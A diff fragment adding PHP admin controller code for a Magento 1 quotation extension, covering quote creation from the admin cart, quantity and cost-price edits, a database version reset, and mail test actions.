+                                'ophirah_qquoteadv_admin_swith2Quote_update_requestitem_save_after_fail',
+                                [
+                                    'quote_item' => $item,
+                                    'qqadvcustomer_id' => $c2qId,
+                                    'qqadvproduct' => $qqadvproduct,
+                                    'exception' => $e
+                                ]
+                            );
+                        }
+                    }
+
+                    Mage::dispatchEvent(
+                        'ophirah_qquoteadv_admin_swith2Quote_update_qqadvproduct_after',
+                        [
+                            'quote_item' => $item,
+                            'qqadvcustomer_id' => $c2qId,
+                            'qqadvproduct' => $qqadvproduct
+                        ]
+                    );
+
+                    $quoteProductAdded[] .= $qqadvproductId;
+                } else {
+                    $superAttribute = $item->getProduct()
+                        ->getTypeInstance(true)
+                        ->getOrderOptions($item->getProduct());
+
+                    $optionalAttrib = '';
+                    if (isset($superAttribute['info_buyRequest'])) {
+                        if (isset($superAttribute['info_buyRequest']['uenc'])) {
+                            unset($superAttribute['info_buyRequest']['uenc']);
+                        }
+
+                        $superAttribute['info_buyRequest']['product'] = $item->getData('product_id');
+                        $superAttribute['info_buyRequest']['qty'] = $item->getQty();
+
+                        $optionalAttrib = serialize($superAttribute['info_buyRequest']);
+                    }
+
+                    $params = [
+                        'product_id' => $item->getProductId(),
+                        'qty' => $item->getQty(),
+                        'price' => $price,
+                        'custom_price' => $customPrice,
+                        'original_price' => $original_price,
+                        'base_quote_rate' => $baseToQuoteRate,
+                        'use_discount' => $useDiscount
+                    ];
+
+                    $qqadvproduct = $this->_create($params, $optionalAttrib);
+
+                    $latestId = max($quoteCollection->getIdsByQuoteId($c2qId));
+                    $quoteProductAdded[] .= $latestId;
+                }
+
+                Mage::dispatchEvent(
+                    'ophirah_qquoteadv_admin_swith2Quote_additem_after',
+                    [
+                        'quote_item' => $item,
+                        'qqadvcustomer_id' => $c2qId,
+                        'qqadvproduct' => $qqadvproduct
+                    ]
+                );
+            }
+
+            //remove unwanted products (removes by id, that could be an issue)
+            foreach ($quoteCollection->getCollection()->addFieldToFilter('quote_id', $c2qId) as $qItem) {
+                $delete = true;
+                foreach ($quoteProductAdded as $id) {
+                    if ($id == $qItem->getId()) {
+                        $delete = false;
+                        break;
+                    }
+                }
+                if ($delete) {
+                    Mage::getModel('qquoteadv/qqadvproduct')->deleteQuote($qItem->getId());
+                }
+            }
+
+            //#update c2q status to make visible c2q request
+            try {
+                $modelCustomer->load($c2qId);
+                $modelCustomer->setIsQuote(1);
+
+                //#for new quote we need correct increment id
+                // And set a status
+                if (!Mage::getSingleton('adminhtml/session')->getUpdateQuoteId()) {
+                    $modelCustomer->setIncrementId(Mage::getModel('qquoteadv/entity_increment_numeric')
+                        ->getNextId($modelCustomer->getStoreId()));
+                    $modelCustomer->setStatus(Ophirah_Qquoteadv_Model_Status::STATUS_PROPOSAL_BEGIN);
+                }
+
+                // Add create hash
+                $modelCustomer->setCreateHash(Mage::helper('qquoteadv/license')
+                    ->getCreateHash($modelCustomer->getIncrementId()));
+
+                //# Add applied SalesRule
+                if ($quote->getData('applied_rule_ids')) {
+                    $code = null;
+                    if (is_string($quote->getData('applied_rule_ids'))) {
+                        $code = $quote->getData('coupon_code');
+                    }
+
+                    if ($code != null) {
+                        $modelCustomer->setData('salesrule', $quote->getData('applied_rule_ids'));
+                    }
+                }
+
+                // Update Address data
+                // TODO: create a better way to store all this data
+                $updateArray = [
+                    'vat_id',
+                    'vat_is_valid',
+                    'vat_request_id',
+                    'vat_request_date',
+                    'vat_request_success'
+                ];
+
+                foreach ($updateArray as $updateValue) {
+                    $modelCustomer->setData($updateValue, $billingAddress->getData($updateValue));
+                    $modelCustomer->setData('shipping_' . $updateValue, $shipAddress->getData($updateValue));
+                }
+
+                if ($shipAddress->getData('same_as_billing') && isset($updateValue)) {
+                    $modelCustomer->setData($updateValue, $shipAddress->getData('same_as_billing'));
+                }
+
+                // Shipping Method
+                if ($shipAddress->getShippingMethod()) {
+                    //$modelCustomer->setData('shipping_method',      $shipAddress->getShippingMethod());
+                    $shippingCodeParts = explode("_", $shipAddress->getShippingMethod());
+                    if (isset($shippingCodeParts[1])) {
+                        $shippingCodeMethod = $shippingCodeParts[1];
+                    } else {
+                        $shippingCodeMethod = $shipAddress->getShippingMethod();
+                    }
+
+                    $modelCustomer->setData('shipping_method',              $shippingCodeMethod);
+                    $modelCustomer->setData('shipping_code',                $shipAddress->getShippingMethod());
+                    $modelCustomer->setData('shipping_description',         $shipAddress->getShippingDescription());
+                    $modelCustomer->setData('address_shipping_method',      $shipAddress->getShippingMethod());
+                    $modelCustomer->setData('address_shipping_description', $shipAddress->getShippingDescription());
+                    $modelCustomer->setData('base_shipping_amount',         $shipAddress->getBaseShippingAmount());
+                    $modelCustomer->setData('weight',                       $shipAddress->getWeight());
+                }
+
+                // Payment Method
+                if (isset($data['payment']) && isset($data['payment']['method'])) {
+                    $paymentMethod = $data['payment']['method'];
+                    $modelCustomer->setPaymentMethod($paymentMethod);
+                }
+                // call getPayment just to trigger some compatibility actions
+                $quote->getPayment();
+
+                //prepare for save
+                $modelCustomer->getShippingAddress()->requestShippingRates(); //generate shipping prices
+                $modelCustomer->updateAddress();
+                $modelCustomer->collectTotals();
+
+                // Save data
+                Mage::dispatchEvent(
+                    'qquoteadv_qqadvcustomer_beforesave_final',
+                    ['quote' => $modelCustomer]
+                );
+
+                $modelCustomer->save();
+
+                Mage::dispatchEvent(
+                    'qquoteadv_qqadvcustomer_aftersave_final',
+                    ['quote' => $modelCustomer]
+                );
+
+                Mage::helper('qquoteadv/logging')->sentAnonymousData('request', 'b', $modelCustomer->getData('quote_id'));
+            } catch (Exception $e) {
+                Mage::log('Exception: ' . $e->getMessage(), null, 'c2q_exception.log', true);
+            }
+
+            // Clear session quote data
+            Mage::getSingleton('adminhtml/session_quote')->clear();
+        }
+
+        Mage::getSingleton('adminhtml/session')->setUpdateQuoteId(null);
+
+        if ($c2qId) {
+            $this->_redirect('adminhtml/qquoteadv/edit', ['id' => $c2qId]);
+        } else {
+            $this->_redirect('*/*');
+        }
+
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_swith2Quote_after', [$c2qId, $quote, $data]);
+    }
+
+    /**
+     * Get customer session data
+     */
+    public function getCustomerSession()
+    {
+        return Mage::getSingleton('customer/session');
+    }
+
+    /**
+     * Insert quote data
+     * $params = array(
+     * 'product' => $item->getProductId(),
+     * 'qty'     => $item->getQty(),
+     * 'price'   => $item->getPrice()
+     * 'original_price' => $item->getProduct()->getPrice();
+     * );
+     * @param $params
+     * @param string $superAttribute
+     * @return bool
+     */
+    private function _create($params, $superAttribute)
+    {
+        $modelProduct = Mage::getModel('qquoteadv/qqadvproduct');
+
+        $hasOption = 0;
+        $options = '';
+        if (isset($params['options'])) {
+            $options = serialize($params['options']);
+            $hasOption = 1;
+        } elseif (isset($superAttribute)) {
+            $attr = unserialize($superAttribute);
+
+            if (isset($attr['options'])) {
+                $options = serialize($attr['options']);
+                $hasOption = 1;
+                $params['qty'] = $attr['qty'];
+            }
+        }
+
+        $quoteId = $this->getCustomerSession()->getQuoteadvId();
+        $qproduct = [
+            'quote_id' => $quoteId,
+            'product_id' => $params['product_id'],
+            'qty' => $params['qty'],
+            'attribute' => $superAttribute,
+            'has_options' => $hasOption,
+            'options' => $options,
+            'use_discount' => $params['use_discount'],
+            'store_id' => Mage::getSingleton('adminhtml/session_quote')->getStoreId() //$this->getCustomerSession()->getStoreId()
+        ];
+
+        // Get Currency rate
+        $rate = (isset($params['base_quote_rate'])) ? $params['base_quote_rate'] : 1;
+
+        // Defining Prices
+        $basePrice = $params['custom_price'] / $rate;
+        $price = $params['custom_price'];
+        $orgPrice = $params['original_price'];
+        $orgCurPrice = $orgPrice * $rate;
+        $mageProduct = Mage::getModel('catalog/product')->load($params['product_id']);
+        try {
+            Mage::dispatchEvent('ophirah_qquoteadv_admin_swith2Quote_add_qqadvproduct_save_before', [
+                    'quote_item' => $mageProduct,
+                    'qqadvcustomer_id' => $quoteId]
+            );
+            $obj = $modelProduct->addProduct($qproduct);
+            Mage::dispatchEvent('ophirah_qquoteadv_admin_swith2Quote_add_qqadvproduct_save_after_success', [
+                    'quote_item' => $mageProduct,
+                    'qqadvcustomer_id' => $quoteId,
+                    'qqadvproduct' => $obj]
+            );
+        } catch (Exception $e) {
+            Mage::log('Exception: ' . $e->getMessage(), null, 'c2q_exception.log', true);
+            Mage::dispatchEvent('ophirah_qquoteadv_admin_swith2Quote_add_qqadvproduct_save_after_fail', [
+                    'quote_item' => $mageProduct,
+                    'qqadvcustomer_id' => $quoteId,
+                    'exception' => $e]
+            );
+        }
+
+        if (isset($obj) && ($obj instanceof Ophirah_Qquoteadv_Model_Qqadvproduct) && $obj->getId()) {
+            try {
+                $requestData = [
+                    'quote_id' => $this->getCustomerSession()->getQuoteadvId(),
+                    'product_id' => $params['product_id'],
+                    'request_qty' => $params['qty'],
+                    'owner_base_price' => $basePrice,
+                    'owner_cur_price' => $price,
+                    'original_price' => $orgPrice,
+                    'original_cur_price' => $orgCurPrice,
+                    'quoteadv_product_id' => $obj->getId()
+                ];
+                Mage::dispatchEvent('ophirah_qquoteadv_admin_swith2Quote_add_requestData_save_before', [
+                        'quote_item' => $mageProduct,
+                        'qqadvcustomer_id' => $quoteId]
+                );
+                Mage::getModel('qquoteadv/requestitem')->setData($requestData)->save();
+                Mage::dispatchEvent('ophirah_qquoteadv_admin_swith2Quote_add_requestData_save_after_success', [
+                        'quote_item' => $mageProduct,
+                        'qqadvcustomer_id' => $quoteId]
+                );
+            } catch (Exception $e) {
+                Mage::log('Exception: ' . $e->getMessage(), null, 'c2q_exception.log', true);
+                Mage::dispatchEvent('ophirah_qquoteadv_admin_swith2Quote_add_requestData_save_after_fail', [
+                        'quote_item' => $mageProduct,
+                        'qqadvcustomer_id' => $quoteId]
+                );
+            }
+            return $obj;
+        } else {
+            return false;
+        }
+    }
+
+    /**
+     * Get core session data
+     */
+    public function getCoreSession()
+    {
+        return Mage::getSingleton('core/session');
+    }
+
+    /**
+     * Action for the delete qty button in the quote edit page
+     */
+    public function deleteQtyFieldAction()
+    {
+        $requestId = (int)$this->getRequest()->getParam('request_id');
+        $c2qId = null;
+        if (empty($requestId)) {
+            $this->_redirect('*/*/*');
+        }
+
+        $item = Mage::getModel('qquoteadv/requestitem')->load($requestId);
+        $c2qId = $item->getData('quote_id');
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_deleteQtyField_before', [$requestId, $c2qId]);
+
+        $_quote = Mage::getSingleton('qquoteadv/qqadvcustomer')->load($c2qId);
+
+        $quoteProductId = $item->getData('quoteadv_product_id');
+        $listRequests = Mage::getModel('qquoteadv/requestitem')->getCollection()->setQuote($_quote);
+        $listRequests->addFieldToFilter('quoteadv_product_id', $quoteProductId);
+        $size = $listRequests->getSize();
+
+        if ($size > 1) {
+            try {
+                $item->delete();
+            } catch (Exception $e) {
+                Mage::getSingleton('adminhtml/session')->addError($e->getMessage());
+                Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+            }
+        } else {
+            $msg = $this->__('Minimum of one Qty is required');
+            Mage::getSingleton('adminhtml/session')->addError($msg);
+        }
+
+        $this->_redirect('*/*/edit', ['id' => $c2qId]);
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_deleteQtyField_after', [$requestId, $c2qId]);
+    }
+
+    /**
+     * Action for the add qty button on the edit quote page
+     *
+     * @return null
+     */
+    public function addQtyFieldAction()
+    {
+        $quoteProductId = (int)$this->getRequest()->getParam('quote_product_id');
+        $quoteProduct = Mage::getModel('qquoteadv/qqadvproduct')->load($this->getRequest()->getParam('quote_product_id'));
+        $product = Mage::getModel('catalog/product')->load($quoteProduct->getData('product_id'));
+
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_addQtyField_before', [$quoteProductId]);
+
+        // For configurable product, use the simple product
+        if ($product->getTypeId() == Mage_Catalog_Model_Product_Type::TYPE_CONFIGURABLE) {
+            $attribute = $quoteProduct->getAttribute();
+            if (!is_array($attribute)) {
+                $attribute = unserialize($attribute);
+            }
+            $prod_simple = Mage::getModel('catalog/product_type_configurable')->getProductByAttributes($attribute['super_attribute'], $product);
+            $check_prod = $prod_simple;
+        } else {
+            $check_prod = $product;
+        }
+
+        $requestQty = $this->getRequest()->getParam('request_qty');
+        $c2qId = $this->getRequest()->getParam('quoteadv_id');
+
+        if(is_array($requestQty)){
+            //bad way of getting the first value of the array
+            foreach($requestQty as $qtyValue){
+                $requestQty = $qtyValue;
+                break;
+            }
+        }
+
+        //echo 'add qty field: ';
+        $check = Mage::helper('qquoteadv')->isQuoteable($check_prod, $requestQty);
+        if ($check->getHasErrors()) {
+            $errors = $check->getErrors();
+            $this->_redirectErr($errors);
+            return null;
+        }
+
+        $productId = null;
+
+        if (empty($quoteProductId) || empty($requestQty)) {
+            $errorMsg = Mage::helper('checkout')->__("Invalid data.");
+            Mage::getSingleton('adminhtml/session')->addError($errorMsg);
+
+            if (!empty($c2qId)) {
+                return $this->_redirect('*/*/edit', ['id' => $c2qId]);
+            } else {
+                return $this->_redirect('*/*/');
+            }
+        }
+
+        //#SEARCH ORIGINAL PRICE
+        $_quote = Mage::getSingleton('qquoteadv/qqadvcustomer')->load($c2qId);
+
+        $_collection = Mage::getModel('qquoteadv/requestitem')->getCollection()->setQuote($_quote)
+            ->addFieldToFilter('quoteadv_product_id', $quoteProductId);
+
+        //#trying to find duplicate of requested quantity value
+        foreach ($_collection as $item) {
+            $c2qId = $item->getData('quote_id');
+
+            $productId = $item->getData('product_id');
+            $check = Mage::helper('qquoteadv')->isQuoteable($productId, $requestQty);
+            if ($check->getHasErrors()) {
+                $errors = $check->getErrors();
+                $this->_redirectErr($errors);
+                return null;
+            }
+
+            if ($requestQty == $item->getData('request_qty')) {
+                $errorMsg = $this->__('Duplicate value entered');
+                Mage::getSingleton('adminhtml/session')->addError($errorMsg);
+                return $this->_redirect('*/*/edit', ['id' => $c2qId]);
+            }
+        }
+
+        //last true is for getting the original price instead of the special price.
+        $ownerPrice = Mage::helper('qquoteadv')->_applyPrice($quoteProductId, $requestQty, false, false);
+        $originalPrice = Mage::helper('qquoteadv')->_applyPrice($quoteProductId, 1, false, true);
+
+        $_quoteadv = $this->getQuotationQuote($c2qId);
+
+        $rate = $_quoteadv->getBase2QuoteRate();
+
+        $basePrice = Mage::helper('qquoteadv')->_applyPrice($quoteProductId, $requestQty, false, true);
+        //$basePrice = $ownerPrice;
+
+        if ($c2qId && $productId && isset($originalPrice) && $requestQty) {
+            $requestData = [
+                'quote_id' => $c2qId,
+                'product_id' => $productId,
+                'request_qty' => $requestQty,
+                'owner_base_price' => $basePrice,
+                'owner_cur_price' => $ownerPrice * $rate,
+                'original_price' => $originalPrice,
+                'quoteadv_product_id' => $quoteProductId,
+                'original_cur_price' => $basePrice * $rate
+            ];
+
+            if ($requestQty) {
+                try {
+                    Mage::getModel('qquoteadv/requestitem')->setData($requestData)->save();
+                } catch (Exception $e) {
+                    Mage::getSingleton('adminhtml/session')->addError($e->getMessage());
+                    Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+                }
+            }
+        }
+        if (!empty($c2qId)) {
+            $this->_redirect('*/*/edit', ['id' => $c2qId]);
+        } else {
+            $this->_redirect('*/*/');
+        }
+
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_addQtyField_after', [$quoteProductId]);
+        return null;
+    }
+
+    /**
+     * Function to get the admin name by the admin id
+     *
+     * @param $id
+     * @return mixed
+     */
+    public function getAdminName($id)
+    {
+        return Mage::helper('qquoteadv')->getAdminName($id);
+    }
+
+
+    /**
+     * Set redirect into response with anchor
+     *
+     * @param $path
+     * @param array $arguments
+     * @param string $anchor
+     * @return $this
+     */
+    protected function _redirectAnhcor($path, $arguments = [], $anchor = '')
+    {
+        $this->_getSession()->setIsUrlNotice($this->getFlag('', self::FLAG_IS_URLS_CHECKED));
+        $this->getResponse()->setRedirect($this->getUrl($path, $arguments) . $anchor);
+        return $this;
+    }
+
+    /**
+     * Action that adds a costprice on the edit quote page
+     */
+    public function addCostPriceAction() {
+        $c2qId = (int)$this->getRequest()->getParam('quoteadv_id');
+        $requestId = $this->getRequest()->getParam('request_id');
+        $newCostPrice = $this->getRequest()->getParam('new_cost_price');
+        $newCostPrice = str_replace(",", ".", $newCostPrice);
+
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_addCostPrice_before', [$c2qId, $requestId, $newCostPrice]);
+
+        if((isset($requestId) && !empty($requestId)) && (isset($c2qId) && !empty($c2qId))){
+            $request_item = Mage::getModel('qquoteadv/requestitem')->load($requestId);
+            $request_item->setCostPrice($newCostPrice);
+            $request_item->save();
+        }
+
+        if (!empty($c2qId)) {
+            $this->_redirect('*/*/edit', ['id' => $c2qId]);
+        } else {
+            $this->_redirect('*/*/');
+        }
+
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_addCostPrice_after', [$c2qId, $requestId, $newCostPrice]);
+    }
+
+    /**
+     * Acl check for admin
+     *
+     * @return bool
+     */
+    protected function _isAllowed()
+    {
+        $aclResource = 'sales/qquoteadv';
+        return Mage::getSingleton('admin/session')->isAllowed($aclResource);
+    }
+
+    /**
+     * Function that gets the quote object
+     *
+     * @param null $quoteId
+     * @return Ophirah_Qquoteadv_Model_Qqadvcustomer
+     */
+    protected function getQuotationQuote($quoteId = null)
+    {
+        //if no quote id is given
+        if($quoteId == null){
+            return $this->_quoteadv;
+        }
+
+        //if quote id is given
+        if ($this->_quoteadv) {
+            //check the id
+            if ($this->_quoteadv->getId() != $quoteId) {
+                $this->_quoteadv = Mage::getModel('qquoteadv/qqadvcustomer')->load($quoteId);
+            }
+        } else {
+            //$this->_quoteadv is not set
+            $this->_quoteadv = Mage::getModel('qquoteadv/qqadvcustomer')->load($quoteId);
+        }
+
+        return $this->_quoteadv;
+    }
+
+    /**
+     * Function that resets the core_resource cart2quote version to the last installed script version.
+     */
+    public function fixdatabaseAction() {
+        $last_update_version = Mage::getStoreConfig('qquoteadv_general/quotations/last_update_version');
+        if($last_update_version){
+            $resource = Mage::getSingleton('core/resource');
+            $writeConnection = $resource->getConnection('core_write');
+            $table = $resource->getTableName('core/resource');
+
+            $versionSql = 'UPDATE ' . $table . ' SET version = "' . $last_update_version . '" WHERE code = "qquoteadv_setup";';
+            $writeConnection->query($versionSql);
+
+            $dataVersionSql = 'UPDATE ' . $table . ' SET data_version = "' . $last_update_version . '" WHERE code = "qquoteadv_setup";';
+            $writeConnection->query($dataVersionSql);
+        }
+
+        $url = Mage::helper("adminhtml")->getUrl("adminhtml/system_config/edit/section/qquoteadv_support");
+        $this->_redirectUrl($url);
+    }
+
+    /**
+     * Function to test Magento mail functionality
+     *
+     * @throws Zend_Validate_Exception
+     */
+    public function testMagentoMailAction()
+    {
+        $testEmailAddress = Mage::getStoreConfig('trans_email/ident_general/email');
+        $senderName = Mage::getStoreConfig('trans_email/ident_general/name');
+        $url = Mage::helper("adminhtml")->getUrl("adminhtml/system_config/edit/section/qquoteadv_support");
+
+        if (!Zend_Validate::is($testEmailAddress, 'EmailAddress')) {
+            Mage::getSingleton('core/session')->addError($this->__('%s is not a valid e-mail address', $testEmailAddress));
+            return $this->_redirectUrl($url);
+        }
+
+        try {
+            $template = Mage::helper('qquoteadv/email')->getEmailTemplateModel();
+            $disabledEmail = Ophirah_Qquoteadv_Model_System_Config_Source_Email_Templatedisable::VALUE_DISABLED_EMAIL;
+            if ($template != $disabledEmail) {
+                $template->setSenderName($senderName);
+                $template->setSenderEmail($testEmailAddress);
+                $template->setTemplateText($this->__('If you received this e-mail the Cart2Quote Magento e-mail test succeeded.'));
+                $template->setTemplateSubject($this->__('Cart2Quote Magento Mail Test'));
+            }
+
+            $template->setData('c2qParams', ['email' => $testEmailAddress, 'name' => $senderName]);
+            Mage::dispatchEvent('ophirah_qquoteadv_addSendMail_before', ['template' => $template]);
+            $result = $template->send($testEmailAddress, $senderName, []);
+            Mage::dispatchEvent('ophirah_qquoteadv_addSendMail_after', ['template' => $template, 'result' => $result]);
+            if ($result) {
+                Mage::getSingleton('core/session')->addSuccess($this->__('Test succesfull. please check the %s inbox to make sure you received the test e-mail', $testEmailAddress));
+                Mage::getSingleton('core/session')->addNotice($this->__('If you did not receive the test e-mail please check your e-mail server'));
+            } else {
+                Mage::getSingleton('core/session')->addError($this->__('Could not send e-mail please check your log files. Make sure you enabled logging System > Configuration > Developer > Log Settings'));
+            }
+        } catch (Exception $e) {
+            Mage::getSingleton('core/session')->addError($this->__('Error sending e-mail: %s', $e->__toString()));
+        }
+
+        return $this->_redirectUrl($url);
+    }
+
+    /**
+     * Function to test PHP mail functionality
+     *
+     * @throws Zend_Validate_Exception
+     */
+    public function testPHPMailAction()
+    {
+        $testEmailAddress = Mage::getStoreConfig('trans_email/ident_general/email');
+        $url = Mage::helper("adminhtml")->getUrl("adminhtml/system_config/edit/section/qquoteadv_support");
+
+        if (!Zend_Validate::is($testEmailAddress, 'EmailAddress')) {
+            Mage::getSingleton('core/session')->addError($this->__('%s is not a valid e-mail address', $testEmailAddress));
+            return $this->_redirectUrl($url);
+        }
+
+        try {
+            $to = $testEmailAddress;
+            $from = $testEmailAddress;
+            $subject = $this->__('Cart2Quote PHP Mail Test');
+            $message = $this->__('If you received this email the Cart2Quote PHP Mail test succeeded.');
+            $headers = sprintf('From: %s', $from);
+            $result = mail($to, $subject, $message, $headers);
+            if ($result) {
+                Mage::getSingleton('core/session')->addSuccess($this->__('Test succesfull. please check the %s inbox to make sure you received the test e-mail', $testEmailAddress));
+                Mage::getSingleton('core/session')->addNotice($this->__('If you did not receive the test e-mail please check your e-mail server'));
+            } else {
+                Mage::getSingleton('core/session')->addError($this->__('Could not send e-mail please check your log files. Make sure you enabled logging System > Configuration > Developer > Log Settings'));
+            }
+        } catch (Exception $e) {
+            Mage::getSingleton('core/session')->addError($this->__('Error sending e-mail: %s', $e->__toString()));
+        }
+
+        $url = Mage::helper("adminhtml")->getUrl("adminhtml/system_config/edit/section/qquoteadv_support");
+        $this->_redirectUrl($url);
+    }
+
+    /**
+     * Ajax sorting action
+     */
+    public function ajaxsortAction()
+    {
+        $postData = $this->getRequest()->getPost();
+        if ($data = $postData['data']) {
+            $ids = [];
+            foreach ($data as $value) {
+                substr($value, 6);
+                $ids[] = substr($value, 6);
+            }
+            $this->sortProducts($ids, $postData['quote_id']);
+        }
+    }
+
+    /**
+     * Sort items
+     *
+     * @param $ids
+     * @param $quoteId
+     */
+    public function sortProducts($ids, $quoteId)
+    {
+        $i = 1;
+        $quoteItems = Mage::getModel('qquoteadv/qqadvproduct')->getCollection()
+            ->addFieldToFilter('quote_id', $quoteId);
+        foreach ($ids as $id) {
+            foreach ($quoteItems as $item) {
+                if ($item->getId() == $id) {
+                    $item->setSortOrder($i);
+                    $item->save();
+                    break;
+                }
+            }
+            $i++;
+        }
+    }
+}
